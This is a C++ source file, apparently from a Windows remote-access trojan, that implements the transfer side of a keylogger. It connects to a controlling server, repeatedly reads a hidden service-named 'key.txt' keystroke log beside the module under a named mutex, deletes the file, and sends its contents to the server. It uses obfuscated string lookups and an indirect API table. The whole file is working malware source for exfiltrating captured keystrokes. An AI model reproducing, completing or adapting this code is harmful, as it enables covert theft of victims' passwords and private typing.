// MyKeyMonTrans.cpp: implementation of the CMyKeyMTrans class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyKeyMTrans.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyKeyMTrans::CMyKeyMTrans()
{
	hExitEvent = m_gFunc.CreateEvent(NULL, TRUE, FALSE, NULL);	
}

CMyKeyMTrans::~CMyKeyMTrans()
{
	m_gFunc.CloseHandle(hExitEvent);
}

void CMyKeyMTrans::CheckSocket()
{
	while(1)
	{
		char ch = 0x00;
		if(!RecvData(&ch, 1))
		{
			break;
		}
	}
	m_gFunc.SetEvent(hExitEvent);
}

DWORD CMyKeyMTrans::CheckSocketThread(LPVOID lPvoid)
{
	CMyKeyMTrans* pThis = (CMyKeyMTrans*) lPvoid;
	pThis->CheckSocket();
	return 0;
}

//控制线程
BOOL CMyKeyMTrans::StartWork(HWND hWnd)
{
	//连接到服务器
	if(!Create(WM_CONNECT_GET_KEY, hWnd))
	{
		return FALSE;
	}

	//\\%skey.txt
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10283, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//保存文件名称
	char m_ModuleFileName[256] = {0};
	m_gFunc.GetModuleFileName(m_ghInstance, m_ModuleFileName, 255);
	char* pStart = m_gFunc.strrchr(m_ModuleFileName, '\\');
	*pStart = 0x00;
	m_gFunc.sprintf(pStart, m_TmpStr, m_DllInfo.m_ServiceName);

	//%skey
	m_gFunc.GetMyString(10284, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//排斥量名称
	char m_WaitMetuxName[256] = {0};
	m_gFunc.sprintf(m_WaitMetuxName, m_TmpStr, m_DllInfo.m_ServiceName);
	HANDLE hKeyWaitMetux = m_gFunc.OpenMutex(SYNCHRONIZE, FALSE, m_WaitMetuxName);
	if(hKeyWaitMetux == NULL)
	{
		return FALSE;
	}

	//启动连接监控线程
	m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) CheckSocketThread, (LPVOID) this, 0, NULL);
	while(m_gFunc.WaitForSingleObject(hExitEvent, 50) == WAIT_TIMEOUT)
	{
		BYTE* pData = NULL;
		DWORD nReadLen = 0;
		m_gFunc.WaitForSingleObject(hKeyWaitMetux, 0xffffffff);
		HANDLE hFile = m_gFunc.CreateFile(m_ModuleFileName,  GENERIC_READ,  FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if(hFile != INVALID_HANDLE_VALUE)
		{
			DWORD nLen = m_gFunc.GetFileSize(hFile, NULL);
			if(nLen > 0)
			{
				pData = new BYTE[nLen];
				m_gFunc.ReadFile(hFile, pData, nLen, &nReadLen, NULL);
			}
			m_gFunc.CloseHandle(hFile);
			m_gFunc.DeleteFile(m_ModuleFileName);
		}
		m_gFunc.ReleaseMutex(hKeyWaitMetux);
		if(nReadLen > 0 && pData != NULL)
		{
			if(!SendDataWithCmd(pData, nReadLen, 0))
			{
				delete [] pData;
				break;
			}
			delete [] pData;
		}
	}
	m_gFunc.CloseHandle(hKeyWaitMetux);
	return TRUE;
}

